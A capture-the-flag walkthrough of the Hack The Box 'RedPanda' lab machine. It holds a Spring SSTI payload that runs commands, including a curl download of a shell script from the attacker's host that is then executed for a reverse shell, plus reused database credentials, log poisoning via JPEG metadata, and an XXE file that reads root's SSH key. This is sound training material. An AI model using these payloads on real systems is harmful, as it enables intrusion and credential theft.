# RedPanda
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `woodenk` | Nmap, SSTI, Command Injection | An initial Nmap scan revealed ports 22 (SSH) and 8080 (HTTP) were open. The web server on port 8080 was running a Spring Boot application, which was found to be vulnerable to Server-Side Template Injection (SSTI). An SSTI payload was crafted and injected into the `/search` endpoint's `name` parameter, allowing for blind command injection. |
| 2 | `woodenk` | Command Injection, Reverse Shell | Exploited the SSTI vulnerability to execute a series of commands to download, give permissions to, and execute a reverse shell script. This resulted in gaining a shell on the target machine as the `woodenk` user. |
| 3 | `woodenk` | Code Analysis, SSH Login | Performed code analysis of the web application's source code, which was accessible through the shell. The `MainController.java` file contained MySQL credentials for the `woodenk` user (`woodenk:RedPandazRule`). These credentials were used to log in to the target machine via SSH. |
| 4 | `root` | `pspy64`, Cronjob, Log Poisoning, XXE | Used `pspy64` to monitor running processes and discovered a cronjob running a Java application as `root` every two minutes. Decompiled the Java application to understand its logic, which involved parsing a log file, reading image metadata, and processing an XML file. This presented a log poisoning and XXE vulnerability. A malicious `.jpg` file with a path traversal in its `Artist` metadata and a crafted XML file with an XXE payload were created. The application log was poisoned with a path traversal payload, which caused the cronjob to read the malicious XML file. The XXE payload was then triggered, allowing the private SSH key of the `root` user to be read from `/root/.ssh/id_rsa`. This key was used to log in as `root`. |
| 5 | `root` | Final Flag | Once logged in as root, the final flag was retrieved. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```shell
Nmap scan report for 10.10.11.170
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 03 Aug 2022 09:02:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 03 Aug 2022 09:02:43 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 03 Aug 2022 09:02:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
```
As we can see there are only two ports open: 22 and 8080.  
As we can see from the banners this application is running over Spring Boot, so we can assume that this is a Java application.  
As we open the site we can see a search engine like page.  
Running directory enumeration shows the following:  
```
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
/error                (Status: 500) [Size: 86]
/export.xml           (Status: 200) [Size: 38]
```
The same can be discovered by simply poking around on the site.  
Now we can try to `wfuzz` all the pages for different vulnerabilities but with no luck.
Now, as we did for [Doctor](Doctor.md) and [Late](Late.md), we can test for SSTI if we test for [SSTI for Java](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).
Now, as we can notice `$` is a banned charachter, so we can test SSTI using `#` or `*` instead:  
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=#{7*7}
```
and, as a response we get:  
```http
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Wed, 03 Aug 2022 10:47:20 GMT
Connection: close
Content-Length: 735

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: ??49_en_US??</h2>
      <h2>There are 0 results for your search</h2>
       
    </div>
    </div>
    
  </body>
</html>
```
As we can see we get the expression evaluated and we can see `49` in the response.  
Now we can test for blind code execution and see if we can trigger code execution from this SSTI injection:  
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{T(java.lang.Runtime).getRuntime().exec('ping+-c+1+10.10.14.9')}
```
As we can see on the `tun0` interface we get `icmp` requests:  
```shell
[root@kali RedPanda ]$ tcpdump -nettti tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 00:00:00.000000 ip: 10.10.11.170 > 10.10.14.9: ICMP echo request, id 3, seq 1, length 64
 00:00:00.000035 ip: 10.10.14.9 > 10.10.11.170: ICMP echo reply, id 3, seq 1, length 64
```

## User
Now that we have tested code execution we can try to pop a shell.  
We can craft our payload as follow; we can download a shell on the local box: 
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{T(java.lang.Runtime).getRuntime().exec('curl+-o+shell.sh+http://10.10.14.9/shell.sh')}
```
change permission to the shell:  
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{T(java.lang.Runtime).getRuntime().exec('chmod+777+shell.sh')}
```
and execute the shell:  
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{T(java.lang.Runtime).getRuntime().exec('bash+shell.sh')}
```
And then we gain a shell on our listener:  
```shell
root@kali:~/Documents/HTB/Boxes/RedPanda# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.170] 38256
bash: cannot set terminal process group (892): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```
## Root
Once we log in, we can poke around on site code and notice the following mysql credentials:  
```shell
src/main/java/com/panda_search/htb/panda_search/MainController.java:            Class.forName("com.mysql.cj.jdbc.Driver");
src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
The database does not contains anything relevant prom privilege escalation perspective, but db credentials can be used to log in as user `woodenk` into the box.  
```shell
[root@kali walkthroughs ]$ ssh -l woodenk $TARGET                    
woodenk@10.10.11.170's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Aug 2022 11:39:55 AM UTC

  System load:           0.06
  Usage of /:            98.0% of 4.30GB
  Memory usage:          67%
  Swap usage:            0%
  Processes:             216
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:b426

  => / is using 98.0% of 4.30GB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  4 08:56:06 2022 from 10.10.14.9
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
woodenk@redpanda:~$ 
```
Once we are in we can notice that user `woodenk` is part of `logs` group, which is odd. Now we can enumerate files owned by this group:  
```shell
woodenk@redpanda:/opt/panda_search$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/opt/panda_search$ find / -type f -group logs 2>/dev/null | grep -v '/sys\|/proc\|/home\|/tmp' 
/opt/panda_search/redpanda.log
/credits/damian_creds.xml
/credits/woodenk_creds.xml
woodenk@redpanda:/opt/panda_search$ ls -l /credits/
total 8
-rw-r----- 1 root logs 422 Aug  4 05:54 damian_creds.xml
-rw-r----- 1 root logs 426 Aug  4 05:54 woodenk_creds.xml
```
As we can see these files are owned by root, so we can assume that there is some process that is writing these files.  
To catch this process we can run `pspy64`:  
```shell
2022/08/04 11:40:01 CMD: UID=1000 PID=70669  | /bin/bash /opt/cleanup.sh 
2022/08/04 11:40:01 CMD: UID=1000 PID=70668  | /bin/bash /opt/cleanup.sh 
2022/08/04 11:40:01 CMD: UID=1000 PID=70675  | 
2022/08/04 11:40:01 CMD: UID=1000 PID=70676  | 
2022/08/04 11:40:01 CMD: UID=1000 PID=70684  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70685  | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70686  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70694  | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70695  | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70696  | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
2022/08/04 11:40:01 CMD: UID=1000 PID=70697  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
2022/08/04 11:42:01 CMD: UID=0    PID=70700  | /usr/sbin/CRON -f 
2022/08/04 11:42:01 CMD: UID=0    PID=70701  | /bin/sh -c /root/run_credits.sh 
2022/08/04 11:42:01 CMD: UID=0    PID=70702  | /bin/sh /root/run_credits.sh 
2022/08/04 11:42:01 CMD: UID=0    PID=70703  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
```
We can notice an odd java process `java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar` that is running as `root`, we can assume this process is running via `cron`.  
dow we can download the `.jar` file unzip the archive and run `jad` to decompile the `.class` file.  
As we open the archive and decompile the source, we can notice the following main function.  
```java
    public static void main(String args[])
        throws JDOMException, IOException, JpegProcessingException
    {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        do
        {
            if(!log_reader.hasNextLine())
                break;
            String line = log_reader.nextLine();
            if(isImage(line))
            {
                Map parsed_data = parseLog(line); //parse format: 200||10.10.14.9||mozilla||/../../../../../../../../home/woodenk/root.jpg
                // Takes images from /opt/panda_search/src/main/resources/static+uri and return the artist value in metadata
                String artist = getArtist(parsed_data.get("uri").toString());
                //buid xmlPath using artist value fed by metadata tag to parse xml 
                String xmlPath = (new StringBuilder()).append("/credits/").append(artist).append("_creds.xml").toString();
                addViewTo(xmlPath, parsed_data.get("uri").toString());
            }
        } while(true);
    }

```
Before exploiting, let's analyse the application.  
This application is reading `/opt/panda_search/redpanda.log` and is parsing the log file. Once the log file is parsed (with `parseLog(line)` function) it gets the `Artist` attribute ( with `getArtist(uri)`) from the `.jpg` metadata located at `uri`. and then is using the `artist` attribute to reconstruct the path of the `.xml` file and it is parsing and changing values (number of views) of the `.xml` file using the `addViewTo(uri)` function.
Now, since there is no input validation on `artist` value and `uri`, we can create a poisoned `.jpg` file containing a path traversal pointing to a malicious `.xml` file poisoned with XXE. Once we have created these files, we can poison the log file with another path traversal, that calls the `.jpg`, the `.jpg` again will have a path traversal pointing to the malicious `.xml`, and the `.xml` itself will contain an XXE that will allow us to read root files, and it will be parsed by the `addViewTo(xmlPath)` function.  
Lo let's start by crafting the `.jpg` file:  
```shell
[root@kali img ]$ exiftool -Artist="../../../home/woodenk/b0d" root.jpg
    1 image files updated
```
Now we can upload the file to `woodenk`'s home directory, and in the same directory, craft a `b0d_creds.xml` file:  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>../../../../../../home/woodenk/root.jpg</uri>
    <hello>&ent;/hello>
    <views>2</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```
the `&ent;` value should be then be replaced with root's ssh key.  
Now we can poison the log by sending the below user agent in an HTTP request:  
```http
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/../../../../../../../../home/woodenk/root.jpg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/stats?author=woodenk
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=
```
now the main function will parse the log and the `uri` variable will be filled with `/../../../../../../../../home/woodenk/root.jpg`.  
This path will be passed to `getArtist(uri)` which will return `../../../home/woodenk/b0d` and this value will be assigned to `artist` value.  
Now, the xmlPath will be bult using `string xmlPath = (new StringBuilder()).append("/credits/").append(artist).append("_creds.xml").toString();` which in our case will result in something like: `/credits/../../../home/woodenk/b0d_creds.xml` and this path will be passed to `addViewTo(xmlPath)` .
This function will parse the `b0d_creds.xml` that will allow us to include external entity into the file, and since this process is running as root we will be able to read root's ssh key:  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>../../../../../../home/woodenk/root.jpg</uri>
    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</hello>
    <views>2</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```
Now we can use this key to log in as root:  
```shell
[root@kali keys ]$ vi id_rsa_root      
[root@kali keys ]$ chmod 600 id_rsa_root      
[root@kali keys ]$ ssh -i id_rsa_root -l root $TARGET  
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Aug 2022 01:28:55 PM UTC

  System load:           0.0
  Usage of /:            98.0% of 4.30GB
  Memory usage:          68%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:b426

  => / is using 98.0% of 4.30GB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 30 13:17:41 2022
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
root@redpanda:~#
```

## Forensics
as we assumed, the java process we snooped with `pspy64` was running as a cronjob:  
```shell
*/2 * * * * /root/run_credits.sh
*/5 * * * * sudo -u woodenk /opt/cleanup.sh
```